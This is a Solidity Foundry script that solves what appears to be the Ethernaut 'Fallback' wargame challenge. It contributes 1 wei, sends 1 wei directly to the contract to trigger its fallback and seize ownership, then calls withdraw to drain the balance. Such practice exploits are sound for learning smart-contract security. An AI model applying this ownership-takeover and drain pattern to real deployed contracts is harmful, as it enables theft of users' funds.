// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { Fallback } from "../src/01_Fallback.sol";

contract FallbackAttacker is Script {
  
  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("Fallback"));
    Fallback challenge = Fallback(challengeInstanceAddress);
    
    vm.startBroadcast(deployerPrivateKey);
    
    challenge.contribute{value: 1 wei}();
    (bool success,) = address(challenge).call{value: 1 wei}("");
    require(success, "Failed call");
    challenge.withdraw();
    
    console.log("Owner: %s", challenge.owner());
    console.log("Balance: %s", address(challenge).balance);
    
    vm.stopBroadcast();
  }
}